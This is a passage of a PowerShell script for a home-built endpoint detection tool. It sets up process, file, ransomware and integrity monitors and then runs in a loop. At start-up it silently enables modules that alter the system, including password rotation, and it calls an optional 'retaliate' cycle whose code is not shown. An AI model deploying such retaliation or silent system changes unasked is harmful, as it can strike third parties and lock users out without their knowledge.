                Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object { $Script:_PollKnownPids[$_.ProcessId] = $true }
            } catch {
                Get-Process -ErrorAction SilentlyContinue | ForEach-Object { $Script:_PollKnownPids[$_.Id] = $true }
            }
            $pollTimer = New-Object Timers.Timer
            $pollTimer.Interval = ($Script:EDRConfig.ScanIntervalSec * 1000)
            $pollTimer.AutoReset = $true
            Register-ObjectEvent $pollTimer Elapsed -SourceIdentifier 'EDR_ProcessMonitor_Poll' -Action {
                try {
                    $current = @{}
                    $procs = $null
                    try { $procs = Get-CimInstance Win32_Process -ErrorAction Stop } catch {}
                    if (-not $procs) {
                        try { $procs = Get-Process -ErrorAction Stop | Select-Object Id, ProcessName, @{N='CommandLine';E={''}}, @{N='ExecutablePath';E={$_.Path}}, @{N='ParentProcessId';E={0}} } catch {}
                    }
                    if (-not $procs) { return }
                    foreach ($p in $procs) {
                        $pid2 = if ($p.PSObject.Properties['ProcessId']) { $p.ProcessId } else { $p.Id }
                        $current[$pid2] = $true
                        if (-not $Script:_PollKnownPids.ContainsKey($pid2)) {
                            $name2 = if ($p.PSObject.Properties['Name']) { $p.Name } else { $p.ProcessName }
                            & $Script:ProcessMonitorAction $pid2 $name2
                        }
                    }
                    $Script:_PollKnownPids = $current
                } catch { }
            } | Out-Null
            $pollTimer.Start()
            $Script:ActiveWatchers.Add($pollTimer) | Out-Null
            $monitorStarted = $true
            Write-EDRLog "ProcessMonitor: started via polling (interval $($Script:EDRConfig.ScanIntervalSec)s)" 'INFO'
        } catch {
            Write-EDRLog "ProcessMonitor: polling fallback also failed ($_)" 'WARN'
        }
    }

    # ── All attempts exhausted — disable until next script run ──
    if (-not $monitorStarted) {
        $Script:EDRConfig.EnableRealTime = $false
        Write-EDRLog 'ProcessMonitor: ALL methods unavailable — real-time process monitoring DISABLED for this run' 'CRITICAL'
    }
}

function Start-FileMonitor {
    foreach ($wp in $Script:EDRConfig.WatchPaths) {
        if (-not (Test-Path $wp)) { continue }
        if ($wp.ToLower().StartsWith($Script:EDRConfig.InstallDir.ToLower())) { continue }
        $w = [System.IO.FileSystemWatcher]::new($wp)
        $w.IncludeSubdirectories = $true
        $w.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor [System.IO.NotifyFilters]::LastWrite
        $w.EnableRaisingEvents = $true
        $ca = Register-ObjectEvent $w Created -Action {
            $path2 = $Event.SourceEventArgs.FullPath
            if (Test-IsExcludedPath $path2) { return }
            $ext2 = [System.IO.Path]::GetExtension($path2).ToLower()
            if ($ext2 -in @('.exe','.dll','.ps1','.bat','.cmd','.vbs','.js','.wsf','.hta','.scr','.msi')) {
                Start-Sleep -Milliseconds 500
                Invoke-FullAnalysis -FilePath $path2
            }
            if ($Script:EDRConfig.EnableRansomwareDetect) { Invoke-RansomwareCheck -EventType 'Created' -NewPath $path2 }
        }
        $rn = Register-ObjectEvent $w Renamed -Action {
            if ($Script:EDRConfig.EnableRansomwareDetect) {
                Invoke-RansomwareCheck -EventType 'Renamed' -OldPath $Event.SourceEventArgs.OldFullPath -NewPath $Event.SourceEventArgs.FullPath
            }
        }
        $Script:ActiveWatchers.Add($ca) | Out-Null
        $Script:ActiveWatchers.Add($rn) | Out-Null
    }
}

function Start-ChainCleanup {
    $timer = New-Object Timers.Timer; $timer.Interval = 60000; $timer.AutoReset = $true
    Register-ObjectEvent $timer Elapsed -SourceIdentifier 'EDR_ChainCleanup' -Action {
        $cutoff = (Get-Date).AddSeconds(-$Script:EDRConfig.ChainTTLSeconds)
        @($Script:ProcessTracker.Keys | Where-Object { $Script:ProcessTracker[$_].StartTime -lt $cutoff }) | ForEach-Object { $Script:ProcessTracker.Remove($_) }
    } | Out-Null
    $timer.Start(); $Script:ActiveWatchers.Add($timer) | Out-Null
}

function Start-IntegrityWatchdog {
    $timer = New-Object Timers.Timer; $timer.Interval = 300000; $timer.AutoReset = $true
    Register-ObjectEvent $timer Elapsed -SourceIdentifier 'EDR_Integrity' -Action { Test-SelfIntegrity } | Out-Null
    $timer.Start(); $Script:ActiveWatchers.Add($timer) | Out-Null
}

# ═══════════════════════════════════════════════════════════════
# SECTION 15: START EDR (FULLY AUTOMATIC)
# ═══════════════════════════════════════════════════════════════
function Start-EDR {
    # Ensure directories
    foreach ($dir in @($Script:EDRConfig.LogPath, $Script:EDRConfig.QuarantinePath)) {
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    }

    # Initialize engines
    Initialize-SelfIntegrity
    Initialize-PInvoke
    Initialize-AMSI
    Initialize-YaraEngine
    Initialize-Whitelist
    Initialize-HashRepDB

    # EDR monitors
    if ($Script:EDRConfig.EnableRealTime) { Start-ProcessMonitor; Start-FileMonitor }
    if ($Script:EDRConfig.EnableNetwork) { Start-NetworkMonitor }
    if ($Script:EDRConfig.EnableChainMonitor) { Start-ChainCleanup }
    Start-IntegrityWatchdog

    # GShield modules
    Invoke-UACEnforce
    if ($Script:EDRConfig.EnableKeyScrambler) { Start-KeyScrambler }
    if ($Script:EDRConfig.EnablePasswordRotator) { Install-PasswordRotator }
    if (-not $Script:NoVpnGate) { Start-VpnGateSmartClient }

    Write-EDRLog '=== Gorstak EDR Started (Fully Automatic Mode) ===' 'INFO'
    Write-EDRLog "Auto-response: ENABLED (Kill=$($Script:ResponseConfig.AutoKillThreshold), Quarantine=$($Script:ResponseConfig.AutoQuarantineThreshold), Block=$($Script:ResponseConfig.AutoBlockThreshold))" 'INFO'
}

# ═══════════════════════════════════════════════════════════════
# MAIN ENTRY - AUTOMATIC START
# ═══════════════════════════════════════════════════════════════

# Suppress all console output
$ConsoleOutput = $false

# Start EDR
Start-EDR

# Main background loop (runs indefinitely)
while ($true) {
    Invoke-UACEnforce
    if ($Script:EDRConfig.EnableRetaliate) { Invoke-RetaliateMonitorCycle }
    Test-SelfIntegrity
    Start-Sleep -Seconds ($IntervalMinutes * 60)
}